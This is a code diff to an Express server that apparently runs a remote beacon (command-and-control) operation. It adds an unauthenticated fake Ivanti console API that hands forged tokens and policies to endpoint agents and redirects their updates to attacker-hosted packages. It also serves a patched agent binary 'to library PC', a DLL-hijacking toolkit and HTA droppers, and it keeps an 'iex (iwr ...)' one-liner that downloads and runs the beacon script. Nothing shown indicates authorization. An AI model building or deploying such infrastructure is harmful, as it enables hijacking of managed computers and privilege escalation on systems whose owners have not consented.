@@ -111,6 +111,140 @@ const server = http.createServer(app);
 
 app.use(express.json({ limit: '50mb' }));
 
+// ── Ivanti Console API Proxy (runs BEFORE auth) ──
+function ivantiApiHandler(req, res, next) {
+  const isAgentApi =
+    req.path.startsWith('/st/console/') ||
+    req.path.startsWith('/privateapi') ||
+    req.path.startsWith('/ServiceModel/') ||
+    req.path.startsWith('/v3.0/') ||
+    req.path.startsWith('/packages/');
+
+  if (!isAgentApi) return next();
+
+  const rawBody = typeof req.body === 'object' ? JSON.stringify(req.body) : String(req.body || '');
+  const queryStr = JSON.stringify(req.query || {});
+  const logEntry = `[${new Date().toISOString()}] ${req.method} ${req.originalUrl}\n` +
+    `  query=${queryStr}\n` +
+    `  headers=${JSON.stringify({
+      host: req.headers.host,
+      'content-type': req.headers['content-type'],
+      'content-length': req.headers['content-length'],
+      authorization: req.headers.authorization ? req.headers.authorization.substring(0, 80) + '...' : undefined,
+      'user-agent': req.headers['user-agent'],
+    })}\n  body=${rawBody}`;
+  console.log('[IVANTI-API]', logEntry);
+  try { fs.appendFileSync('/tmp/agent-requests.log', logEntry + '\n'); } catch {}
+  try { fs.appendFileSync('/tmp/agent-requests-raw.log', JSON.stringify({ts:new Date().toISOString(),method:req.method,url:req.originalUrl,query:req.query,headers:req.headers,body:req.body}) + '\n'); } catch {}
+
+  const p = req.path;
+
+  // ── Serve package files for download ──
+  if (p.startsWith('/packages/')) {
+    const pkgName = path.basename(p);
+    const pkgDir = path.join(__dirname, 'public', 'packages');
+    const pkgPath = path.join(pkgDir, pkgName);
+    if (fs.existsSync(pkgPath)) {
+      return res.download(pkgPath, pkgName);
+    }
+    // Create a placeholder response mimicking what the agent expects
+    return res.status(404).json({ error: 'Package not found', requested: pkgName });
+  }
+
+  // ── OAuth2 Token endpoint (STS)
+  if (p.includes('/oauth2/connect/token') || p.includes('/token')) {
+    return res.json({
+      access_token: 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.fake-token-for-agent',
+      token_type: 'Bearer',
+      expires_in: 3600,
+      scope: 'agent_support',
+    });
+  }
+
+  // ── GetPoliciesByCookie (list-policies, called BEFORE register)
+  if (p.includes('/bycookie')) {
+    return res.json({
+      d: [
+        {
+          PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
+          PolicyName: 'Default Policy',
+          PolicyType: 'Security',
+          PolicyVersion: 1,
+        }
+      ]
+    });
+  }
+
+  // ── RegisterAgent (called by STAgentCtl register --host)
+  if (req.method === 'POST' && (p.includes('/RegisterAgent') || p.includes('/register'))) {
+    return res.json({
+      d: {
+        __type: 'RegisterAgentResult',
+        Success: true,
+        AgentId: 'f47ac10b-58cc-4372-a567-0e02b2c3d479',
+        AgentGuid: 'f47ac10b-58cc-4372-a567-0e02b2c3d479',
+        ConsoleCertificateSerialNumber: '00deadbeefcafe01',
+        PolicyName: 'Default Policy',
+        PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
+        Message: 'Registration successful',
+      }
+    });
+  }
+
+  // ── State Synchronization (check-in, called by STAgentUpdater -checkin)
+  if (p.includes('/synchronize') || p.includes('/Synchronize')) {
+    return res.json({
+      d: {
+        __type: 'SynchronizeResult',
+        license: { LicenseId: '00000000-0000-0000-0000-000000000000', Status: 'Valid' },
+        latestPolicy: {
+          PolicyName: 'Default Policy',
+          PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
+          PolicyVersion: 1,
+          PolicyType: 'Security',
+          AgentConfigurationXml: '<agentConfiguration><update enabled="true"/><updateSource url="https://' + req.headers.host + '/packages/"/></agentConfiguration>',
+        },
+        latestServiceCertificate: null,
+        credentials: [],
+        attachments: {},
+        certificateChain: [],
+        issuedCertificate: null,
+      }
+    });
+  }
+
+  // ── Certificate endpoints
+  if (p.includes('/certificate/update') || p.includes('/Certificate/Update')) {
+    return res.json({ d: { __type: 'OperationResult', Success: true, Message: 'Certificate updated' } });
+  }
+  if (p.includes('/certificate/request') || p.includes('/Certificate/Request')) {
+    return res.json({ d: { __type: 'OperationResult', Success: true, Message: 'Certificate request processed' } });
+  }
+
+  // ── Policy state / agent state (legacy)
+  if (p.includes('/AgentState') || p.includes('/agentstate') || p.includes('/Checkin') || p.includes('/checkin') || p.includes('/policy') || p.includes('/Policy')) {
+    return res.json({
+      d: {
+        __type: 'GetPolicyStateResult',
+        PolicyName: 'Default Policy',
+        PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
+        PolicyVersion: 1,
+        AgentConfigurationXml: '<agentConfiguration><update enabled="true"/><updateSource url="https://' + req.headers.host + '/packages/"/></agentConfiguration>',
+      }
+    });
+  }
+
+  // ── Download / Manifest
+  if (p.includes('/download') || p.includes('/Download') || p.includes('/manifest') || p.includes('/Manifest')) {
+    return res.json({ d: { __type: 'DownloadManifestResult', Success: true, FileEntries: [] } });
+  }
+
+  // ── Catch-all — log and return plausible success
+  return res.json({ d: { __type: 'OperationResult', Success: true } });
+}
+
+app.use(ivantiApiHandler);
+
 // Simple auth middleware
 app.use((req, res, next) => {
   if (!AUTH_TOKEN) return next();
@@ -124,7 +258,7 @@ app.use((req, res, next) => {
     return next();
   }
 
-  if (req.path === '/health' || req.path.startsWith('/api/') || req.path === '/beacon-script' || req.path === '/beacon-run' || req.path === '/oneliner' || req.path === '/connect' || req.path.startsWith('/download/') || req.path.endsWith('.hta')) {
+  if (req.path === '/health' || req.path.startsWith('/api/') || req.path === '/beacon-script' || req.path === '/beacon-run' || req.path === '/oneliner' || req.path === '/connect' || req.path === '/patched-binary' || req.path === '/spartacus' || req.path.startsWith('/spartacus-assets/') || req.path.startsWith('/tool/') || req.path.startsWith('/download/') || req.path.endsWith('.hta')) {
     return next();
   }
 
@@ -272,7 +406,7 @@ app.post('/api/beacon/command', checkBeaconAuth, async (req, res) => {
 
 // Serve the beacon PowerShell script for easy copy-paste
 app.get('/beacon-script', (req, res) => {
-  const tunnelHost = getExternalHost();
+  const tunnelHost = resolvePublicHost(req);
   reqHost = tunnelHost || req.headers.host || 'localhost:3000';
   reqWsProtocol = 'wss';
   res.type('text/plain').send(getBeaconScript());
@@ -493,7 +627,7 @@ app.get('/api/beacon/list', (req, res) => {
 
 // Serve the raw one-liner as plain text (no HTML) — for easy copy from browser
 app.get('/oneliner', (req, res) => {
-  const tunnelHost = getExternalHost();
+  const tunnelHost = resolvePublicHost(req);
   const scheme = 'https';
   const scriptUrl = scheme + '://' + tunnelHost + '/beacon-script';
   const oneLiner = 'iex (iwr -Uri ' + scriptUrl + ').Content';
@@ -501,16 +635,69 @@ app.get('/oneliner', (req, res) => {
 });
 
 // ──────────────────────────────────────────────
-// Download endpoint — serve .vbs and .bat as downloadable files
+// Download endpoint — serve .vbs, .bat, .hta as downloadable files
+// .hta files get the tunnel URL injected
 // ──────────────────────────────────────────────
 app.get('/download/:filename', (req, res) => {
   const filename = req.params.filename;
-  // Only allow specific filenames — prevent path traversal
   const allowed = ['connect.vbs', 'connect.bat', 'connect.hta', 'connect-schtasks.hta'];
   if (!allowed.includes(filename)) {
     return res.status(404).send('File not found');
   }
   const filePath = path.join(__dirname, 'public', filename);
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send('File not found');
+  }
+  if (filename.endsWith('.hta')) {
+    const tunnelHost = resolvePublicHost(req);
+    const tunnelUrl = 'https://' + tunnelHost;
+    let content = fs.readFileSync(filePath, 'utf8');
+    content = content.replace(/__TUNNEL_URL__/g, tunnelUrl);
+    res.type('application/hta').send(content);
+    return;
+  }
+  res.download(filePath, filename);
+});
+
+// Serve patched STAgentCtl.exe for download to library PC
+app.get('/patched-binary', (req, res) => {
+  const filePath = '/tmp/STAgentCtl_patched.exe';
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send('Patched binary not found — rebuild on dev machine first');
+  }
+  res.download(filePath, 'STAgentCtl.exe');
+});
+
+// Serve Spartacus DLL hijacking toolkit
+app.get('/spartacus', (req, res) => {
+  const filePath = path.join(__dirname, '..', 'spartacus', 'Spartacus.exe');
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send('Spartacus.exe not found');
+  }
+  res.download(filePath, 'Spartacus.exe');
+});
+
+app.get('/spartacus-assets/:filename', (req, res) => {
+  const filename = req.params.filename;
+  const allowed = ['prototypes.csv'];
+  if (!allowed.includes(filename)) {
+    return res.status(404).send('File not found');
+  }
+  const filePath = path.join(__dirname, '..', 'spartacus', 'Assets', filename);
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send('File not found');
+  }
+  res.download(filePath, filename);
+});
+
+// Serve tools (ProcMon, etc.) from /tmp/procmon/
+app.get('/tool/:filename', (req, res) => {
+  const filename = req.params.filename;
+  const allowed = ['Procmon64.exe', 'Procmon.exe', 'Procmon64a.exe'];
+  if (!allowed.includes(filename)) {
+    return res.status(404).send('File not found');
+  }
+  const filePath = path.join('/tmp/procmon/', filename);
   if (!fs.existsSync(filePath)) {
     return res.status(404).send('File not found');
   }
@@ -520,7 +707,7 @@ app.get('/download/:filename', (req, res) => {
 // View raw file in browser (text display, not download) — for copy-paste into Notepad
 app.get('/view/:filename', (req, res) => {
   const filename = req.params.filename;
-  const allowed = ['connect.vbs', 'connect.bat', 'grok-report.txt', 'test_com.ps1', 'test_stagent.ps1'];
+  const allowed = ['connect.vbs', 'connect.bat', 'grok-report.txt', 'test_com.ps1', 'test_stagent.ps1', 'enum_modules.py', 'run_patched_simple.ps1', 'enum_modules_cs.ps1', 'check_arch.py', 'scan_acls_system.ps1', 'deploy_acl_scan.ps1'];
   if (!allowed.includes(filename)) {
     return res.status(404).send('File not found');
   }
@@ -535,7 +722,7 @@ app.get('/view/:filename', (req, res) => {
 // Connect page — download VBScript/BAT to connect the beacon
 // ──────────────────────────────────────────────
 app.get('/connect', (req, res) => {
-  const externalHost = getExternalHost();
+  const externalHost = resolvePublicHost(req);
   const tunnelUrl = 'https://' + externalHost;
 
   res.send(`
